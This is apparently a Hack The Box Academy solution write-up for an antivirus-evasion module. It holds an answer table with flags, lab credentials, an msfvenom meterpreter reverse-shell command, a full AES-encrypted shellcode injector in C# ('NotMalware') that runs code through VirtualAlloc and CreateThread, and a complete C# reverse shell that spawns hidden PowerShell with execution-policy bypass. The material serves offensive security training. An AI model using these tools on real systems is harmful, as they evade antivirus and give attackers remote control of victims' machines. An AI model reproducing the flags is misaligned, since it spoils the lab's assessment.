| Section | Question Number | Answer |
| --- | --- | --- |
| Introduction | Question 1 | dllexp.chm |
| Microsoft Defender Antivirus | Question 1 | B6F71055-05CB-4BCE-A823-507103C278EA |
| Microsoft Defender Antivirus | Question 2 | 1.415.38.0 |
| Static Analysis | Question 1 | 784bb810b0d63b8639394b2c0ca4de7c |
| Dynamic Analysis | Question 1 | 634fb69bb4a3fe27bf1a5170e1b11e40 |
| Process Injection | Question 1 | 17de9751f2606408c71aa04fb4f2a88e |
| Antimalware Scan Interface | Question 1 | 5afb0c1409b589b78a7ba8aaef6390d9 |
| Open-Source Software | Question 1 | {2781761E-28E0-4109-99FE-B9D127C57AFE} |
| User Account Control | Question 1 | C:\\Windows\\System32\\ComputerDefaults.exe |
| AppLocker | Question 1 | %OSDRIVE%\\Users\\beta\\Desktop\\2.3.ps1 |
| LOLBAS: InstallUtil | Question 1 | c0aaa7685c2a8040c3140a3f905e2486 |
| LOLBAS: RunDll32 | Question 1 | a3b186d9645589bc5ca28dc74cefc668 |
| PowerShell ContrainedLanguage Mode | Question 1 | 1ab1e261cea2f1512b28dfe235f2dbbd |
| Skills Assessment I | Question 1 | cc2576956e4992ebb7891dac76e04cbf |
| Skills Assessment II | Question 1 | a354cb848380f9da5dcfa6852c81276f |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Introduction

## Question 1

### "Connect to EVASION-DEV and submit the name of the second file within the 'C:\\Tools\\dllexp-x64\\' directory."

After spawning the target machine, students need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.101]─[htb-ac-413848@htb-slcee2eiut]─[~]
└──╼ [★]$ xfreerdp /v:10.129.32.2 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution

[08:34:11:979] [3875:3876] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[08:34:11:979] [3875:3876] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.32.2:3389) 
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - Common Name (CN):
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[08:34:11:979] [3875:3876] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.32.2:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

After navigating to the `C:\Tools\dllexp-x64` directory, students will find that the second file is named `dllexp.chm`:

![[HTB Solutions/CAPE/z. images/7f3f396673e53106144fd7b4beb36c26_MD5.jpg]]

Answer: `dllexp.chm`

# Microsoft Defender Antivirus

## Question 1

### "Use the Defender Module for PowerShell to find the value of ComputerID."

After spawning the target machine, students need to connect to it with `xfreerdp` using the credentials `alpha:FGQxrLW2`:

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.101]─[htb-ac-413848@htb-slcee2eiut]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.213 /u:alpha /p:FGQxrLW2 /dynamic-resolution

[08:45:59:649] [4184:4185] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[08:45:59:649] [4184:4185] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - Common Name (CN):
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[08:45:59:649] [4184:4185] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

When using the `Get-MpComputerStatus` Cmdlet of the PowerShell `Defender` module, students will discover that the value of `ComputerID` is `B6F71055-05CB-4BCE-A823-507103C278EA`:

Code: powershell

```powershell
Get-MpComputerStatus | Select-Object -Property ComputerID
```

```
PS C:\Users\alpha> Get-MpComputerStatus | Select-Object -Property ComputerID

ComputerID
----------
B6F71055-05CB-4BCE-A823-507103C278EA
```

Answer: `B6F71055-05CB-4BCE-A823-507103C278EA`

# Microsoft Defender Antivirus

## Question 2

### "What is the version of the antivirus signatures which are installed?"

Using the same `xfreerdp` connection from the previous question, students need to use `Get-MpComputerStatus` to find that the value of `NISSignatureVersion`, which indicates the version of the antivirus signatures installed, is `1.415.38.0`:

Code: powershell

```powershell
Get-MpComputerStatus | Select-Object -Property NISSignatureVersion
```

```
PS C:\Users\alpha> Get-MpComputerStatus | Select-Object -Property NISSignatureVersion

NISSignatureVersion
-------------------
1.415.38.0
```

Answer: `1.415.38.0`

# Static Analysis

## Question 1

### "Follow the steps of this section to recreate the shellcode injector (with your own shellcode), compile it, and place the EXE file inside "C:\\Alpha\\Static". After placing the file, wait up to a minute; if all checks pass, the file "C:\\Alpha\\Static\\flag.txt" will be created, containing the flag."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.101]─[htb-ac-413848@htb-e4ik4ovvni]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[12:49:52:784] [3859:3860] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[12:49:52:784] [3859:3860] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[12:49:52:784] [3859:3860] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[12:49:52:925] [3859:3860] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[12:49:52:925] [3859:3860] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[12:49:52:925] [3859:3860] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, on `Pwnbox`, students need to use `msfvenom` to generate any payload (a reverse shell used here) using the C# format and save it to a file:

Code: shell

```shell
msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST=STMIP LPORT=STMPO -f csharp -o rawPayload
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xaga6aubja]─[~]
└──╼ [★]$ msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST=10.10.15.103 LPORT=9001 -f csharp -o rawPayload

No encoder specified, outputting raw payload
Payload size: 772 bytes
Final size of csharp file: 3954 bytes
Saved as: rawPayload
```

To remove all newlines from the payload and only retrieve the bytes surrounded by curly brackets, students can utilize `sed`:

Code: shell

```shell
cat rawPayload | sed ':a;N;$!ba;s/\n//g' | sed -n 's/.*{\(.*\)}.*/\1/p' | sed 's/.$//'
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xaga6aubja]─[~]
└──╼ [★]$ cat rawPayload | sed ':a;N;$!ba;s/\n//g' | sed -n 's/.*{\(.*\)}.*/\1/p'

0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x48,0x31<SNIP>
```

To generate a random IV for AES, students can use `openssl` and then convert the key to fit the syntax of C#:

Code: shell

```shell
hexRandom=$(echo -n $(openssl rand -out /dev/stdout 16) | xxd -p)
echo $hexRandom
for ((i = 0; i < ${#hexRandom}; i+= 2)) do echo -n "0x${hexRandom:i:2},"; done | sed 's/.$//'; echo
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xaga6aubja]─[~]
└──╼ [★]$ hexRandom=$(echo -n $(openssl rand -out /dev/stdout 16) | xxd -p)
echo $hexRandom
for ((i = 0; i < ${#hexRandom}; i+= 2)) do echo -n "0x${hexRandom:i:2},"; done | sed 's/.$//'; echo

d9ad9d56dc617b482166565d10153d7b
0xd9,0xad,0x9d,0x56,0xdc,0x61,0x7b,0x48,0x21,0x66,0x56,0x5d,0x10,0x15,0x3d,0x7b
```

Students also need to generate a random AES encryption key:

Code: shell

```shell
hexRandom=$(echo -n $(openssl rand -out /dev/stdout 16) | xxd -p)
echo $hexRandom
for ((i = 0; i < ${#hexRandom}; i+= 2)) do echo -n "0x${hexRandom:i:2},"; done | sed 's/.$//'; echo
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xaga6aubja]─[~]
└──╼ [★]$ hexRandom=$(echo -n $(openssl rand -out /dev/stdout 16) | xxd -p)
echo $hexRandom
for ((i = 0; i < ${#hexRandom}; i+= 2)) do echo -n "0x${hexRandom:i:2},"; done | sed 's/.$//'; echo

93e95b4c93d171560d0dxc9db3b964515
0x93,0xe9,0x5b,0x4c,0x03,0xd1,0x71,0x56,0x0d,0x0d,0xc9,0xdb,0x3b,0x96,0x45,0x15
```

Students then need to use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex\('0x%20with%20comma'\)AES_Encrypt\(%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D,'CBC','Raw','Hex',%7B'option':'Hex','string':''%7D\)To_Base64\('A-Za-z0-9%2B/%3D'\)) to AES-encrypt the `Msfvenom` payload:

![[HTB Solutions/CAPE/z. images/4e87b788cfbb1ce343474a732a701694_MD5.jpg]]

Subsequently, students need to create a `Console App (.NET Framework)` project using Visual Studio 2022, and develop C# code (as provided in the section) that decrypts the AES-encrypted `Msfvenom` payload and then executes it via Windows API functions:

Code: csharp

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            string encryptedPayload = "ODdiMmI1NGIyNzEwNDZlZDc2NWZkNmRlYTI1OGRkNzQxZWNjNGEzMDVhYjg3MWM3ZmFlNmJiODU3ZDU1ZDg5NzgzMmRkNjVmYWQ0OGIwNzZmMTY3ZWRkOWJkNmFmZDgyNTJkYWQyYTk5ODQyYWM3YmM4YWU0YzQ5ZDE3YzU4MWMyNGViZDI5OTA3NzcwZjFlMDQyMDMyMmYzNjlhMjk5NmRiOTE4ZGJhMWQ2YWJlZmY3NmY1MTUzMWVkNjIzNmYwZDA5MDI1MTE4OTFlODdjM2E3NzFhY2VjMzAyMjg3NmJmZWFlMDgwMGU0OGU3ZmNlMWQ2ZDZhZDU1NjM0ZjY2MGE2ZDhmM2Y5OTc2MTU3NWEyZjZjYzljYWRlMGE3MGNkMjM0M2RmNTZlODg3NmVjOWNiZTgwNDIzYThjODk2MTU0NWFiN2Q1NDNlOWFjN2JkMzQ1ZTEzZTU2YzI3NzE5NWNlN2E1MTc1ZTA2YjIwMGVjYzc1MTkyZWVjZGU0NjNkNjk5NzNmYTczZTBkMDgxYTU1YzBlZTZlMTc1MTVlZTk0YmVkNTU4ZGFjOWEzN2Y3NDE5MjVjOTEyYmI4ZTJlZjAxYjVhMTk3M2Q4NjgxN2IxZDUzZDI0MTZmZDY1OWE5YTA5OWEwMTAyNjE4YWJkYjMxNDAxYjllNDQzNjc3Nzc5ZTEwODNhM2EyMGMwNzgxNzFiYzE2ZTg1OTgwOTVjZmIzYWJhZTVkZTFlMzg2YmQ2OGE2YWQxZGZjMDk3MThkODhhYmU3NjIxNGFlYWQ3MmVmNWNkNTFmYTg5ZGFlYzY0MTI3MWY1MGM0MDcyYmM2ZDQ2ZDQ1YWVjNzlmYzhiNWFmNzc4MzUwNTk3NmZiZTE2NzQ0MmJkODNlMzU4MTI4MmVkZTBlNTYxZTM5MGEyZDNkNGQ4YTZlMjA4OTJkNjgwNDNlMGMyY2JjYmY0YmZlMDU5MDQ1NmEzOTRlMGQyNGY1MzA5MTU4NGU3ZWIxY2E1NjUxMThjYzY0ZDE2MDg0OTRiNmIyMmViZGE4ODE1YzIwNjVmNzE3MGQ1NzdkZTE3YWI3MjIxZGYyNmQyYjRiNGNjNWU0N2UyMDVkMDNlNTA0MDU2ZjhkODYwMGI0ZDZjYTE3NGZkOWZmM2MyYjdlZjc2MzRmYjcwYzg4MDZjMzA5ODEzYmM5NTdiOTMzZTU4ODQ5NGI4NTEzYTRlM2NhZWZkYTk5ZjU2MWMyMzE1MzM1YzhhNWVkY2NlMWE4ZTA5OWRlYWQwMGJiNDNmOWQ5ODY4YzczMWI3NThmYmExMzUxYmMxMTg5ZGE4YjUyNTEwMGE0OTM5YTg1ZGY3YzQ4YmE3ODRhOWIzYzQwODcwZGZlZDNjNjhmZmM0ZDg5Yjg5NTk1OGU0YTZmNDUxYWZiN2YyZGQyNjUxY2Q5NTEwMjI4OWVjY2Q2Y2RlZDI5ZTQ0ZGRhZDUzZjI5MjIxYzY3OTI5MTVhMGY0ZmRmZWEwODRjNjFlZGJhYzExN2MxYTg1MzE5MDBlMWNlMjI5YWQwZDUwMWRlNTgxMDRiODk1NDFjNWU5MWMyZWQ4ZGNjZGUyNDViNGFjOTQxZDhjNWU4OTMwMGNmN2RkZDE2MzVhM2I1OGNkYzkyMjZlMzRlNmFjNDNkZTgwYjg1ZTRmYTFkMjk4ZDFlNDU4MWI3OTU1YzZiMTg4OTU1MjAzYjRhZDkyZWFmMDIzNWIwODZjMDk2MGRhMGEwNGI4OTYwNjNlZGU3OTA3MGZiZmNiZjg0ZDE2ZWI2M2I2ZmJkNWM1MGI5NDM5YjBiY2M3OWZjYTZlZjc4MGUyZDFmNzdiMzMwYWQ3NWVlNDk2NTYxYTIyNzA5YTdmNTIwYWY1OTRkMzgxMGJmNmFkMGQ4MDMxYzAyYzIwNDAyMDRmZjAwMmMyZDFlYTIyZmFmZjc1MDJlZTc2YzMzOTdiNWI4NjVlNmU3ZGJiNDU0OGQzMjExZTZlM2I1ZDZiMGE1NWJlMTFlM2RjZjJlM2JjZmM0MGM2ODQ2ZTRiNGEyMjBlMDQyNjFkMjlhYmU4ZjlhNTMxZTU4ZGY0MWEzNjY0NzJmMWRiNzlhYjA=";

            // Decrypt Payload
            Aes AES = Aes.Create();
            byte[] AESKey = new byte[16] { 0xd9, 0xad, 0x9d, 0x56, 0xdc, 0x61, 0x7b, 0x48, 0x21, 0x66, 0x56, 0x5d, 0x10, 0x15, 0x3d, 0x7b };
            byte[] AESIV
                = new byte[16] { 0x93, 0xe9, 0x5b, 0x4c, 0x03, 0xd1, 0x71, 0x56, 0x0d, 0x0d, 0xc9, 0xdb, 0x3b, 0x96, 0x45, 0x15 };
            ICryptoTransform AESDecryptor = AES.CreateDecryptor(AESKey, AESIV);
            byte[] buffer;
            using (MemoryStream memoryStreamDecrypt = new MemoryStream(Convert.FromBase64String(encryptedPayload)))
            {
                using (var cryptoStreamEncrypt = new CryptoStream(memoryStreamDecrypt, AESDecryptor, CryptoStreamMode.Read))
                {
                    using (var memoryStreamPlain = new System.IO.MemoryStream())
                    {
                        cryptoStreamEncrypt.CopyTo(memoryStreamPlain);
                        buffer = memoryStreamPlain.ToArray();
                    }
                }
            }

            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buffer.Length, 0x1000, 0x04);
            Marshal.Copy(buffer, 0, lpStartAddress, buffer.Length);
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buffer.Length, 0x20, out lpflOldProtect);
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}
```

Before building the solution (using the keystrokes `Ctrl + Shift + B`), students should switch to the `Release` solution configuration (rather than `Debug`):

![[HTB Solutions/CAPE/z. images/a5f4bf49e0a221fb9209db3037d4ff9c_MD5.jpg]]

Afterwards, students need to copy the compiled executable in the `Release` folder to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy C:\Tools\NotMalware\NotMalware\bin\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

```
PS C:\Users\Administrator> copy C:\Tools\NotMalware\NotMalware\bin\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

Students then need to launch the target machine in the `Static Analysis` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xaga6aubja]─[~]
└──╼ [★]$ xfreerdp /v:10.129.197.170 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[14:33:56:935] [9898:9899] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[14:33:56:935] [9898:9899] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.197.170:3389) 
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - Common Name (CN):
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[14:33:56:935] [9898:9899] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.197.170:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled executable from the shared folder on `Pwnbox` to `C:\Alpha\Static`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\Static
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\Static
```

After waiting for a minute, students will attain the flag `784bb810b0d63b8639394b2c0ca4de7c` when reading the contents of the file `C:\Alpha\Static\flag.txt`:

Code: powershell

```powershell
more C:\Alpha\Static\flag.txt
```

```
PS C:\Users\alpha> more C:\Alpha\Static\flag.txt

784bb810b0d63b8639394b2c0ca4de7c
```

Answer: `784bb810b0d63b8639394b2c0ca4de7c`

# Dynamic Analysis

## Question 1

### "Place an EXE file inside "C:\\Alpha\\Dynamic" and wait up to a minute until another user scans and then runs the program. Your goal is to get a reverse shell and submit the contents at "C:\\Users\\beta\\Desktop\\flag.txt"."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to create a `Console App (.NET Framework)` project using Visual Studio 2022 and develop C# code that establishes a reverse shell, utilizing either the custom-built reverse shell, 'RShell', provided in the section or [micr0\_shell](https://github.com/senzee1984/micr0_shell) (the former approach will be used).

Instead of reading `PWNIP` and `PWNPO` as command-line arguments, students need to hardcode them:

Code: csharp

```csharp
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell
{
    internal class Program
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it

        static void Main(string[] args)
        {
            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect("PWNIP", PWNPO);

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }

        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
```

Before building the solution (using the keystrokes `Ctrl + Shift + B`), students should switch to the `Release` solution configuration (rather than `Debug`):

![[HTB Solutions/CAPE/z. images/fe1c3d980fcc47001e763784e7cb987e_MD5.jpg]]

Afterward, students need to copy the compiled executable in the `Release` folder to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy C:\Tools\NotMalware\NotMalware\bin\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

```
PS C:\Users\Administrator> copy C:\Tools\NotMalware\NotMalware\bin\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

